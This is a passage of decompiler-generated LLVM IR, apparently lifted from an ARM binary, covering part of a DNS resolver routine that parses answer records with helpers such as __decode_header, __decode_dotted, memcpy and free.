  br i1 %v8_1c5a8, label %dec_label_pc_1c5d4, label %dec_label_pc_1c5ac

dec_label_pc_1c5ac:                               ; preds = %dec_label_pc_1c5d4, %dec_label_pc_1c5f0, %dec_label_pc_1c59c
  %v0_1c5ac = load i32, i32* @r4, align 4
  %v1_1c5ac = add i32 %v0_1c5ac, -1000
  store i32 %v1_1c5ac, i32* @r4, align 4
  %v7_1c5ac = icmp eq i32 %v0_1c5ac, 1000
  %tmp283 = zext i1 %v7_1c5ac to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c5bc = icmp slt i32 %v5_1c59c, 0
  br i1 %v1_1c5bc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1c5ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c964

thread-pre-split:                                 ; preds = %dec_label_pc_1c5ac
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c5ac, label %dec_label_pc_1c964, label %dec_label_pc_1c560

dec_label_pc_1c5d4:                               ; preds = %dec_label_pc_1c59c
  store i32 %v2_1c488, i32* %r1.global-to-local, align 4
  %v0_1c5d8 = load i32, i32* @sl, align 4
  %v2_1c5dc = inttoptr i32 %v0_1c5d8 to i8*
  %v3_1c5dc = call i32 @__decode_header(i8* %v2_1c5dc, i32 %v2_1c488)
  %v3_1c5e0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1c5e0, i32* %r3.global-to-local, align 4
  store i32 %v3_1c440, i32* %r1.global-to-local, align 4
  %v3_1c5e8 = icmp uge i32 %v3_1c5e0, %v3_1c440
  store i1 %v3_1c5e8, i1* %cpsr_c.global-to-local, align 1
  %v9_1c5e8 = icmp eq i32 %v3_1c5e0, %v3_1c440
  br i1 %v9_1c5e8, label %dec_label_pc_1c5f0, label %dec_label_pc_1c5ac

dec_label_pc_1c5f0:                               ; preds = %dec_label_pc_1c5d4
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c5f4, label %dec_label_pc_1c5ac, label %dec_label_pc_1c5fc

dec_label_pc_1c5fc:                               ; preds = %dec_label_pc_1c5f0
  store i32 %v1_1c600, i32* %r3.global-to-local, align 4
  store i1 %v2_1c604, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1c600.cmp, label %dec_label_pc_1c638, label %dec_label_pc_1c60c

dec_label_pc_1c60c:                               ; preds = %dec_label_pc_1c5fc
  store i1 %v2_1c610, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c610, label %dec_label_pc_1c62c, label %dec_label_pc_1c618

dec_label_pc_1c618:                               ; preds = %dec_label_pc_1c60c
  store i32 %v4_1c384, i32* @r5, align 4
  %v1_1c61c = add i32 %v4_1c384, -1
  store i32 %v1_1c61c, i32* %r3.global-to-local, align 4
  %v0_1c620 = load i32, i32* @sb, align 4
  %v3_1c620 = icmp uge i32 %v0_1c620, %v1_1c61c
  store i1 %v3_1c620, i1* %cpsr_c.global-to-local, align 1
  %v5_1c624 = icmp slt i32 %v0_1c620, %v1_1c61c
  br i1 %v5_1c624, label %.thread7, label %dec_label_pc_1c62c

.thread7:                                         ; preds = %dec_label_pc_1c618
  %v7_1c624 = add i32 %v0_1c620, 1
  br label %dec_label_pc_1c974

dec_label_pc_1c62c:                               ; preds = %dec_label_pc_1c618, %dec_label_pc_1c60c
  %v0_1c62c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1c660

dec_label_pc_1c638:                               ; preds = %dec_label_pc_1c5fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c638, label %dec_label_pc_1c640, label %dec_label_pc_1c964

dec_label_pc_1c640:                               ; preds = %dec_label_pc_1c638
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_1c658, label %dec_label_pc_1c668

dec_label_pc_1c658:                               ; preds = %dec_label_pc_1c640
  %v0_1c658 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1c660

dec_label_pc_1c660:                               ; preds = %dec_label_pc_1c62c, %dec_label_pc_1c658
  %storemerge2 = phi i32 [ %v0_1c658, %dec_label_pc_1c658 ], [ %v0_1c62c, %dec_label_pc_1c62c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1c658 ], [ 1, %dec_label_pc_1c62c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1c660 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1c660, align 4
  br label %dec_label_pc_1c9ac

dec_label_pc_1c668:                               ; preds = %dec_label_pc_1c640
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1c66c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1c66c = add i32 %v0_1c66c.pre, 12
  store i32 %v2_1c66c, i32* @r4, align 4
  %v3_1c66c = icmp ugt i32 %v0_1c66c.pre, -13
  store i1 %v3_1c66c, i1* %cpsr_c.global-to-local, align 1
  %v9_1c66c = icmp eq i32 %v2_1c66c, 0
  br i1 %v9_1c66c, label %dec_label_pc_1c964, label %dec_label_pc_1c674

dec_label_pc_1c674:                               ; preds = %dec_label_pc_1c668
  %v2_1c678 = add i32 %v5_1c59c, -12
  store i32 %v2_1c678, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_1c678, 1
  br i1 %tmp223, label %dec_label_pc_1c964, label %dec_label_pc_1c688

dec_label_pc_1c680thread-pre-split:               ; preds = %dec_label_pc_1c6a4
  %v2_1c6b015 = add i32 %v2_1c694, -1
  store i32 %v2_1c6b015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1c6b015, 1
  br i1 %tmp224, label %dec_label_pc_1c964, label %dec_label_pc_1c688

dec_label_pc_1c688:                               ; preds = %dec_label_pc_1c674, %dec_label_pc_1c680thread-pre-split
  %v1_1c6ac = phi i32 [ %v2_1c6b015, %dec_label_pc_1c680thread-pre-split ], [ %v2_1c678, %dec_label_pc_1c674 ]
  %v0_1c688 = phi i32 [ %v2_1c69c, %dec_label_pc_1c680thread-pre-split ], [ %v2_1c66c, %dec_label_pc_1c674 ]
  %v1_1c688 = inttoptr i32 %v0_1c688 to i8*
  %v2_1c688 = load i8, i8* %v1_1c688, align 1
  %v3_1c688 = zext i8 %v2_1c688 to i32
  store i32 %v3_1c688, i32* %r3.global-to-local, align 4
  %v5_1c688 = add i32 %v0_1c688, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c68c = icmp eq i8 %v2_1c688, 0
  %v2_1c694 = sub i32 %v1_1c6ac, %v3_1c688
  store i32 %v2_1c694, i32* @lr, align 4
  %v1_1c698 = and i32 %v3_1c688, 192
  store i32 %v1_1c698, i32* @ip, align 4
  %v2_1c69c = add i32 %v3_1c688, %v5_1c688
  br i1 %v2_1c68c, label %dec_label_pc_1c6b8, label %dec_label_pc_1c6a4

dec_label_pc_1c6a4:                               ; preds = %dec_label_pc_1c688
  %v2_1c6a4 = icmp eq i32 %v1_1c698, 192
  store i1 %v2_1c6a4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c6a4, label %.thread9, label %dec_label_pc_1c680thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1c6a4
  %v2_1c6a8 = add i32 %v0_1c688, 2
  %v2_1c6ac = add i32 %v1_1c6ac, -2
  store i32 %v2_1c6ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c6b8

dec_label_pc_1c6b8:                               ; preds = %dec_label_pc_1c688, %.thread9
  %v1_1c6c4 = phi i32 [ %v2_1c6a8, %.thread9 ], [ %v5_1c688, %dec_label_pc_1c688 ]
  %v0_1c6b8 = phi i32 [ %v2_1c6ac, %.thread9 ], [ %v1_1c6ac, %dec_label_pc_1c688 ]
  %v1_1c6b8 = add i32 %v0_1c6b8, -3
  %v2_1c6b8 = icmp ugt i32 %v0_1c6b8, 2
  store i1 %v2_1c6b8, i1* %cpsr_c.global-to-local, align 1
  %v3_1c6b8 = sub i32 2, %v0_1c6b8
  %v4_1c6b8 = and i32 %v3_1c6b8, %v0_1c6b8
  %v5_1c6b8 = icmp slt i32 %v4_1c6b8, 0
  %v6_1c6b8 = icmp slt i32 %v1_1c6b8, 0
  %v7_1c6b8 = icmp eq i32 %v0_1c6b8, 3
  %v3_1c6bc = xor i1 %v6_1c6b8, %v5_1c6b8
  %v4_1c6bc = or i1 %v7_1c6b8, %v3_1c6bc
  br i1 %v4_1c6bc, label %dec_label_pc_1c964, label %dec_label_pc_1c6c0

dec_label_pc_1c6c0:                               ; preds = %dec_label_pc_1c6b8
  %v1_1c6c0 = sub i32 -8, %v0_1c66c.pre
  %v2_1c6c4 = add i32 %v1_1c6c4, %v1_1c6c0
  store i32 %v2_1c6c4, i32* %r3.global-to-local, align 4
  %v3_1c6c4 = icmp ult i32 %v2_1c6c4, %v1_1c6c0
  store i1 %v3_1c6c4, i1* %cpsr_c.global-to-local, align 1
  %v8_1c6c4 = icmp slt i32 %v2_1c6c4, 0
  br i1 %v8_1c6c4, label %dec_label_pc_1c964, label %dec_label_pc_1c6e8

dec_label_pc_1c6e8:                               ; preds = %dec_label_pc_1c6c0
  %v2_1c6d0 = add i32 %v2_1c6c4, 12
  store i32 %v2_1c6d0, i32* %r1.global-to-local, align 4
  store i32 %v2_1c6f0, i32* @r5, align 4
  store i32 %v2_1c6f4, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1c93856, label %dec_label_pc_1c70c, label %dec_label_pc_1c93c

dec_label_pc_1c70c:                               ; preds = %dec_label_pc_1c6e8, %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge
  %v0_1c710 = phi i32 [ %v0_1c710.pre, %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge ], [ %v0_1c66c.pre, %dec_label_pc_1c6e8 ]
  %stack_var_-460.364 = phi i32 [ %v2_1c91c, %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge ], [ %v2_1c6d0, %dec_label_pc_1c6e8 ]
  %stack_var_-452.061 = phi i32 [ %v1_1c920, %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge ], [ 0, %dec_label_pc_1c6e8 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge ], [ 1, %dec_label_pc_1c6e8 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_1c6f0, i32* %r3.global-to-local, align 4
  %v5_1c724 = call i32 @__decode_dotted(i32 %v0_1c710, i32 %stack_var_-460.364, i32 %v5_1c59c, i32 %v2_1c6f0, i32 256)
  store i32 %v5_1c724, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c728 = icmp slt i32 %v5_1c724, 0
  br i1 %v1_1c728, label %dec_label_pc_1c7f8, label %dec_label_pc_1c730

dec_label_pc_1c730:                               ; preds = %dec_label_pc_1c70c
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_1c738 = add i32 %v5_1c724, 10
  store i32 %v1_1c738, i32* @sb, align 4
  %v2_1c73c = sub i32 %v5_1c59c, %stack_var_-460.364
  %v2_1c740 = sub i32 %v2_1c73c, %v1_1c738
  store i32 %v2_1c740, i32* %r3.global-to-local, align 4
  %v3_1c740 = icmp uge i32 %v2_1c73c, %v1_1c738
  store i1 %v3_1c740, i1* %cpsr_c.global-to-local, align 1
  %v8_1c740 = icmp slt i32 %v2_1c740, 0
  br i1 %v8_1c740, label %dec_label_pc_1c7f0.thread, label %dec_label_pc_1c750

dec_label_pc_1c7f0.thread:                        ; preds = %dec_label_pc_1c730
  store i32 %v2_1c740, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c7f8

dec_label_pc_1c750:                               ; preds = %dec_label_pc_1c730
  %v2_1c754 = call i32 @__GI_strdup(i8* %v1_1c754)
  %v0_1c75c = load i32, i32* @r4, align 4
  %v2_1c75c = add i32 %v0_1c75c, %stack_var_-460.364
  %v0_1c760 = load i32, i32* @sl, align 4
  %v2_1c760 = add i32 %v0_1c760, %v2_1c75c
  store i32 %v2_1c760, i32* %r1.global-to-local, align 4
  %v1_1c764 = add i32 %v2_1c760, 2
  store i32 %v1_1c764, i32* %ip.global-to-local, align 4
  %v1_1c768 = add i32 %v2_1c760, 4
  store i32 %v1_1c768, i32* %r3.global-to-local, align 4
  %v1_1c76c = add i32 %v2_1c760, 5
  %v2_1c76c = inttoptr i32 %v1_1c76c to i8*
  %v3_1c76c = load i8, i8* %v2_1c76c, align 1
  %v4_1c76c = zext i8 %v3_1c76c to i32
  %v1_1c774 = add i32 %v2_1c760, 8
  %v2_1c774 = inttoptr i32 %v1_1c774 to i8*
  %v3_1c774 = load i8, i8* %v2_1c774, align 1
  %v4_1c774 = zext i8 %v3_1c774 to i32
  %v1_1c780 = add i32 %v2_1c760, 6
  %v2_1c780 = inttoptr i32 %v1_1c780 to i8*
  %v3_1c780 = load i8, i8* %v2_1c780, align 1
  %v4_1c780 = zext i8 %v3_1c780 to i32
  store i32 %v4_1c780, i32* %r3.global-to-local, align 4
  %v1_1c784 = add i32 %v2_1c760, 9
  %v2_1c784 = inttoptr i32 %v1_1c784 to i8*
  %v3_1c784 = load i8, i8* %v2_1c784, align 1
  %v4_1c784 = zext i8 %v3_1c784 to i32
  %v3_1c78c = inttoptr i32 %v2_1c760 to i8*
  %v4_1c78c = load i8, i8* %v3_1c78c, align 1
  %v6_1c78c = zext i8 %v4_1c78c to i32
  %v1_1c790 = add i32 %v2_1c760, 3
  %v2_1c790 = inttoptr i32 %v1_1c790 to i8*
  %v3_1c790 = load i8, i8* %v2_1c790, align 1
  %v4_1c790 = zext i8 %v3_1c790 to i32
  store i32 %v4_1c790, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1c798 = inttoptr i32 %v1_1c764 to i8*
  %v3_1c798 = load i8, i8* %v2_1c798, align 1
  %v4_1c798 = zext i8 %v3_1c798 to i32
  store i32 %v4_1c798, i32* %ip.global-to-local, align 4
  %v1_1c79c = add i32 %v2_1c760, 1
  %v2_1c79c = inttoptr i32 %v1_1c79c to i8*
  %v3_1c79c = load i8, i8* %v2_1c79c, align 1
  %v4_1c79c = zext i8 %v3_1c79c to i32
  %v4_1c7a0 = mul nuw nsw i32 %v4_1c774, 256
  %v5_1c7a0 = or i32 %v4_1c784, %v4_1c7a0
  store i32 %v5_1c7a0, i32* @r6, align 4
  store i32 %v4_1c76c, i32* @r7, align 4
  %v4_1c7a8 = mul nuw nsw i32 %v6_1c78c, 256
  %v5_1c7a8 = or i32 %v4_1c79c, %v4_1c7a8
  store i32 %v5_1c7a8, i32* @lr, align 4
  %v4_1c7ac = mul nuw nsw i32 %v4_1c798, 256
  %v5_1c7ac = or i32 %v4_1c7ac, %v4_1c790
  store i32 %v5_1c7ac, i32* %r3.global-to-local, align 4
  store i32 %v2_1c740, i32* @r5, align 4
  store i32 %v4_1c780, i32* @ip, align 4
  %v1_1c7c0 = add i32 %v2_1c760, 10
  store i32 %v1_1c7c0, i32* %r1.global-to-local, align 4
  %v1_1c7c4 = add i32 %v2_1c75c, 10
  store i32 %v1_1c7c4, i32* @r4, align 4
  %v2_1c7c8 = sub i32 %v2_1c740, %v5_1c7a0
  %v3_1c7c8 = icmp uge i32 %v2_1c740, %v5_1c7a0
  store i1 %v3_1c7c8, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_1c7c8
  %v6_1c7c8 = and i32 %v2_1c740, %tmp226
  %v7_1c7c8 = icmp slt i32 %v6_1c7c8, 0
  %v8_1c7c8 = icmp slt i32 %v2_1c7c8, 0
  store i32 %v2_1c754, i32* %stack_var_-144, align 4
  %v2_1c7e8 = xor i1 %v8_1c7c8, %v7_1c7c8
  br i1 %v2_1c7e8, label %dec_label_pc_1c7f8, label %dec_label_pc_1c7f0

dec_label_pc_1c7f0:                               ; preds = %dec_label_pc_1c750
  %v0_1c7ec = load i32, i32* @sb, align 4
  %v2_1c7ec = add i32 %v0_1c7ec, %v5_1c7a0
  store i32 %v2_1c7ec, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c7f0 = icmp slt i32 %v2_1c7ec, 0
  br i1 %v1_1c7f0, label %dec_label_pc_1c7f8, label %dec_label_pc_1c814

dec_label_pc_1c7f8:                               ; preds = %dec_label_pc_1c7f0, %dec_label_pc_1c750, %dec_label_pc_1c70c, %dec_label_pc_1c7f0.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c7fc = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_1c7fc, label %dec_label_pc_1c964, label %dec_label_pc_1c804

dec_label_pc_1c804:                               ; preds = %dec_label_pc_1c7f8
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c808, label %dec_label_pc_1c964, label %dec_label_pc_1c93c

dec_label_pc_1c814:                               ; preds = %dec_label_pc_1c7f0
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c818 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_1c818, label %dec_label_pc_1c8bc, label %dec_label_pc_1c820

dec_label_pc_1c820:                               ; preds = %dec_label_pc_1c814
  %v0_1c820 = load i32, i32* @fp, align 4
  %v1_1c820 = add i32 %v0_1c820, 28
  store i32 %v1_1c820, i32* %r3.global-to-local, align 4
  %v1_1c824 = inttoptr i32 %v1_1c820 to i32*
  %v2_1c824 = load i32, i32* %v1_1c824, align 4
  store i32 %v2_1c824, i32* @r3, align 4
  %v3_1c824 = add i32 %v0_1c820, 32
  %v4_1c824 = inttoptr i32 %v3_1c824 to i32*
  %v5_1c824 = load i32, i32* %v4_1c824, align 4
  store i32 %v5_1c824, i32* @ip, align 4
  %v6_1c824 = add i32 %v0_1c820, 36
  %v7_1c824 = inttoptr i32 %v6_1c824 to i32*
  %v8_1c824 = load i32, i32* %v7_1c824, align 4
  store i32 %v8_1c824, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1c820, i32* @r0, align 4
  store i32 %v2_1c6f4, i32* @r1, align 4
  %v0_1c840 = call i32 @memcpy()
  %v0_1c844 = load i32, i32* @fp, align 4
  %v1_1c844 = add i32 %v0_1c844, 4
  %v2_1c844 = inttoptr i32 %v1_1c844 to i32*
  %v3_1c844 = load i32, i32* %v2_1c844, align 4
  %v2_1c848 = icmp ugt i32 %v3_1c844, 23
  store i1 %v2_1c848, i1* %cpsr_c.global-to-local, align 1
  %v7_1c848 = icmp eq i32 %v3_1c844, 24
  br i1 %v7_1c848, label %dec_label_pc_1c86c, label %dec_label_pc_1c850

dec_label_pc_1c850:                               ; preds = %dec_label_pc_1c820
  %v1_1c850 = add i32 %v0_1c844, 28
  %v2_1c850 = inttoptr i32 %v1_1c850 to i32*
  %v3_1c850 = load i32, i32* %v2_1c850, align 4
  store i32 %v3_1c850, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c854 = icmp eq i32 %v3_1c850, 0
  br i1 %v2_1c854, label %dec_label_pc_1c93c, label %dec_label_pc_1c85c

dec_label_pc_1c85c:                               ; preds = %dec_label_pc_1c850
  store i1 %v2_1c860, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c860, label %dec_label_pc_1c86c, label %bb227

bb227:                                            ; preds = %dec_label_pc_1c85c
  store i1 %v3_1c864, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1c864, label %dec_label_pc_1c86c, label %dec_label_pc_1c93c

dec_label_pc_1c86c:                               ; preds = %dec_label_pc_1c85c, %bb227, %dec_label_pc_1c820
  store i32 %v0_1c244, i32* %r1.global-to-local, align 4
  %v3_1c870 = icmp uge i32 %v3_1c844, %v0_1c244
  store i1 %v3_1c870, i1* %cpsr_c.global-to-local, align 1
  %v9_1c870 = icmp eq i32 %v3_1c844, %v0_1c244
  br i1 %v9_1c870, label %dec_label_pc_1c880, label %bb228

bb228:                                            ; preds = %dec_label_pc_1c86c
  br label %dec_label_pc_1c914

dec_label_pc_1c880:                               ; preds = %dec_label_pc_1c86c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_1c888 = add i32 %v0_1c844, 16
  %v2_1c888 = inttoptr i32 %v1_1c888 to i32*
  %v3_1c888 = load i32, i32* %v2_1c888, align 4
  %v2_1c88c = sub i32 %tmp159, %stack_var_-452.061
  %v1_1c890 = add i32 %v2_1c88c, -1
  store i32 %v1_1c890, i32* %r3.global-to-local, align 4
  %v1_1c894 = add i32 %v3_1c888, 4
  %v2_1c898 = mul i32 %v1_1c894, %v1_1c890
  store i32 %v2_1c898, i32* %r1.global-to-local, align 4
  %v1_1c89c = add i32 %v0_1c844, 32
  %v2_1c89c = inttoptr i32 %v1_1c89c to i32*
  %v3_1c89c = load i32, i32* %v2_1c89c, align 4
  %v3_1c8a0 = icmp uge i32 %v2_1c898, %v3_1c89c
  store i1 %v3_1c8a0, i1* %cpsr_c.global-to-local, align 1
  %v2_1c8a4 = add i32 %v0_1c844, 36
  %v3_1c8a4 = inttoptr i32 %v2_1c8a4 to i32*
  store i32 %v1_1c890, i32* %v3_1c8a4, align 4
  %tmp286 = icmp ugt i32 %v2_1c898, %v3_1c89c
  br i1 %tmp286, label %dec_label_pc_1c93c, label %dec_label_pc_1c8ac

dec_label_pc_1c8ac:                               ; preds = %dec_label_pc_1c880
  store i32 0, i32* @r7, align 4
  %v1_1c8b4 = load i32, i32* @fp, align 4
  %v2_1c8b4 = add i32 %v1_1c8b4, 36
  %v3_1c8b4 = inttoptr i32 %v2_1c8b4 to i32*
  store i32 0, i32* %v3_1c8b4, align 4
  br label %dec_label_pc_1c914

dec_label_pc_1c8bc:                               ; preds = %dec_label_pc_1c814
  store i32 %v2_1c754, i32* @r0, align 4
  %v0_1c8c0 = call i32 @free()
  store i32 %v5_1c7a8, i32* %r3.global-to-local, align 4
  store i32 %v0_1c244, i32* @ip, align 4
  %v3_1c8cc = icmp uge i32 %v5_1c7a8, %v0_1c244
  store i1 %v3_1c8cc, i1* %cpsr_c.global-to-local, align 1
  %v9_1c8cc = icmp eq i32 %v5_1c7a8, %v0_1c244
  br i1 %v9_1c8cc, label %dec_label_pc_1c8d4, label %dec_label_pc_1c914

dec_label_pc_1c8d4:                               ; preds = %dec_label_pc_1c8bc
  %v0_1c8d4 = load i32, i32* @fp, align 4
  %v1_1c8d4 = add i32 %v0_1c8d4, 16
  %v2_1c8d4 = inttoptr i32 %v1_1c8d4 to i32*
  %v3_1c8d4 = load i32, i32* %v2_1c8d4, align 4
  store i32 %v3_1c8d4, i32* %r1.global-to-local, align 4
  store i32 %v5_1c7a0, i32* %r3.global-to-local, align 4
  %v3_1c8dc = icmp uge i32 %v3_1c8d4, %v5_1c7a0
  store i1 %v3_1c8dc, i1* %cpsr_c.global-to-local, align 1
  %v9_1c8dc = icmp eq i32 %v3_1c8d4, %v5_1c7a0
  br i1 %v9_1c8dc, label %dec_label_pc_1c8f0, label %dec_label_pc_1c8e4

dec_label_pc_1c8e4:                               ; preds = %dec_label_pc_1c8d4
  %v1_1c8e4 = inttoptr i32 %v0_1c8d4 to i32*
  %v2_1c8e4 = load i32, i32* %v1_1c8e4, align 4
  store i32 %v2_1c8e4, i32* @r0, align 4
  %v0_1c8e8 = call i32 @free()
  br label %dec_label_pc_1c964

dec_label_pc_1c8f0:                               ; preds = %dec_label_pc_1c8d4
  %v1_1c8f0 = add i32 %v0_1c8d4, 36
  %v2_1c8f0 = inttoptr i32 %v1_1c8f0 to i32*
  %v3_1c8f0 = load i32, i32* %v2_1c8f0, align 4
  %v1_1c8f4 = add i32 %v0_1c8d4, 28
  %v2_1c8f4 = inttoptr i32 %v1_1c8f4 to i32*
  %v3_1c8f4 = load i32, i32* %v2_1c8f4, align 4
  store i32 %v3_1c8f4, i32* @r3, align 4
  %v3_1c8f8 = mul i32 %v3_1c8f0, %v5_1c7a0
  %v4_1c8f8 = add i32 %v3_1c8f4, %v3_1c8f8
  store i32 %v4_1c8f8, i32* @r0, align 4
  store i32 %v5_1c7a0, i32* @r2, align 4
  store i32 %v1_1c7c0, i32* @r1, align 4
  %v0_1c904 = call i32 @memcpy()
  %v0_1c908 = load i32, i32* @fp, align 4
  %v1_1c908 = add i32 %v0_1c908, 36
  %v2_1c908 = inttoptr i32 %v1_1c908 to i32*
  %v3_1c908 = load i32, i32* %v2_1c908, align 4
  %v1_1c90c = add i32 %v3_1c908, 1
  store i32 %v1_1c90c, i32* %r3.global-to-local, align 4
  store i32 %v1_1c90c, i32* %v2_1c908, align 4
  br label %dec_label_pc_1c914

dec_label_pc_1c914:                               ; preds = %bb228, %dec_label_pc_1c8bc, %dec_label_pc_1c8ac, %dec_label_pc_1c8f0
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1c8f0 ], [ 0, %dec_label_pc_1c8bc ], [ 0, %dec_label_pc_1c8ac ], [ 1, %bb228 ]
  %v1_1c91c = load i32, i32* @r4, align 4
  %v1_1c920 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_1c920, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1c934 = icmp uge i32 %v1_1c920, %tmp159
  store i1 %v3_1c934, i1* %cpsr_c.global-to-local, align 1
  %v5_1c938 = icmp slt i32 %v1_1c920, %tmp159
  br i1 %v5_1c938, label %dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge, label %dec_label_pc_1c93c

dec_label_pc_1c914.dec_label_pc_1c70c_crit_edge:  ; preds = %dec_label_pc_1c914
  %v2_1c91c = add i32 %v1_1c91c, %stack_var_-460.364
  %v0_1c710.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1c70c

dec_label_pc_1c93c:                               ; preds = %dec_label_pc_1c804, %dec_label_pc_1c6e8, %dec_label_pc_1c914, %dec_label_pc_1c850, %dec_label_pc_1c880, %bb227
  %v1_1c940 = call i32 @__GI_close(i32 %v3_1c514)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c948 = icmp eq i32 %arg3, 0
  br i1 %v2_1c948, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1c93c
  %v1_1c950 = load i32, i32* @sl, align 4
  %v3_1c94c = inttoptr i32 %arg3 to i32*
  store i32 %v1_1c950, i32* %v3_1c94c, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1c93c
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_1c958.1200 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1c948, i32 ptrtoint (i32* @global_var_16e04.850 to i32))
  store i32 %v1_1c28c, i32* @r0, align 4
  %v0_1c95c = call i32 @free()
  br label %dec_label_pc_1c9cc

dec_label_pc_1c964:                               ; preds = %thread-pre-split, %dec_label_pc_1c560, %dec_label_pc_1c6c0, %dec_label_pc_1c6b8, %dec_label_pc_1c668, %dec_label_pc_1c674, %dec_label_pc_1c680thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1c638, %dec_label_pc_1c804, %dec_label_pc_1c7f8, %dec_label_pc_1c524, %dec_label_pc_1c504, %dec_label_pc_1c8e4
  %v1_1c968 = add i32 %v0_1c428, 1
  store i32 %v1_1c968, i32* @r5, align 4
  br label %dec_label_pc_1c974

dec_label_pc_1c974:                               ; preds = %.thread7, %dec_label_pc_1c964
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1c964 ], [ %v7_1c624, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_1c968, %dec_label_pc_1c964 ], [ %v0_1c428, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_1c978 = add i32 %stack_var_-476.1, -1
  store i32 %v1_1c978, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_1c978, 1
  br i1 %tmp232, label %dec_label_pc_1c994, label %dec_label_pc_1c32c

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c4d8, %bb218, %bb213, %.thread5, %dec_label_pc_1c2a8
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1c994

dec_label_pc_1c994:                               ; preds = %dec_label_pc_1c974, %.thread132, %dec_label_pc_1c98c
  %stack_var_-472.1 = phi i32 [ %v1_1c28c, %dec_label_pc_1c98c ], [ 0, %.thread132 ], [ %v1_1c28c, %dec_label_pc_1c974 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1c98c ], [ -1, %.thread132 ], [ %v3_1c514, %dec_label_pc_1c974 ]
  %v0_1c994 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
